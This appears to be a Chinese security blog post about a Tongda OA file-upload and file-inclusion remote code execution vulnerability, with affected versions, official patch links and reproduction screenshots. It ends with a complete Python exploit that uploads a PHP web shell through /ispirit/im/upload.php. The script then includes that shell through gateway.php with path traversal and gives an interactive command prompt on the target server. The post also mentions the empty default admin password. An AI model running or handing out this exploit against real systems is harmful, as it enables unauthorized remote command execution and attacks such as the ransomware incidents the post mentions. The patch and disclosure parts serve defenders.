---
title: 通达oa文件上传+文件包含远程代码执行漏洞
tags: [通达OA]
categories: [远程代码执行,文件上传]
keywords: [通达OA]
description: 通达oa文件上传后文件包含导致远程代码执行
abbrlink: de0d7bed
date: 2020-06-04 11:01:57
---

## 漏洞说明
通达OA是一套办公系统.近日通达OA官方在其官方论坛披露了近期一起通达OA用户服务器遭受勒索病毒攻击事件并发布了多个版本的漏洞补丁.漏洞类型为任意文件上传,受影响的版本存在文件包含漏洞. 未授权的远程攻击者可以通过精心构造的请求包进行文件包含并触发远程代码执行.

## OA通达简介
通达OA是由北京通达信科科技有限公司研发的一款通用型OA产品，涵盖了个人事务、行政办公、流程审批、知识管理、人力资源管理、组织机构管理等企业信息化管理功能。2015年，通达云OA入驻阿里云企业应用专区，已为众多中小企业提供了稳定、可靠、强悍的云计算支撑。

## 影响版本

tongdaOA V11
tangdaOA 2017
tangdaOA 2016
tangdaOA 2015
tangdaOA 2013 增强版
tangdaOA 2013

## 修复
版本	更新包下载地址
V11版	http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe
2017版	http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe
2016版	http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe
2015版	http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe
2013增强版	http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe
2013版	http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe

## 漏洞复现

通过官网下载OA软装.
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319134816478.png)

在window下执行TDOA11.3默认提示安装
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135009254.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135022896.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319134951736.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135046159.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135057980.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135113728.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135131943.png)
默认用户admin，密码为空

上传文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135228606.png)
文件包含
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135914479.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200319135659413.png)


## 脚本

```
#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
# oa通达文件上传加文件包含远程代码执行

import requests
import re
import sys

def oa(url):
    upurl = url + '/ispirit/im/upload.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
    data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['cmd'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
    req = requests.post(url=upurl, headers=headers, data=data)
    filename = "".join(re.findall("2003_(.+?)\|",req.text))
    in_url = url + '/ispirit/interface/gateway.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = "json={\"url\":\"../../../general/../attach/im/2003/%s.jpg\"}&cmd=%s" % (filename,"echo php00py")
    include_req = requests.post(url=in_url, headers=headers, data=data)
    if  'php00py' in include_req.text:
        print("[+] OA RCE vulnerability ")
        return filename
    else:
        print("[-] Not OA RCE vulnerability ")
        return False


def oa_rce(url, filename,command):
    url = url + '/ispirit/interface/gateway.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = "json={\"url\":\"../../../general/../attach/im/2003/%s.jpg\"}&cmd=%s" % (filename,command)
    req = requests.post(url, headers=headers, data=data)
    print(req.text)



if __name__ == '__main__':
        if len(sys.argv) < 2:
            print("please input your url python oa_rce.py http://127.0.0.1:8181")
        else:
            url = sys.argv[1]
            filename = oa(url)
            while filename:
                try:
                    command = input("wran@shelLhost#")
                
                    if command == "exit" or command == "quit":
                        break
                    else:
                        oa_rce(url,filename,command)
                except KeyboardInterrupt:
                    break 

```


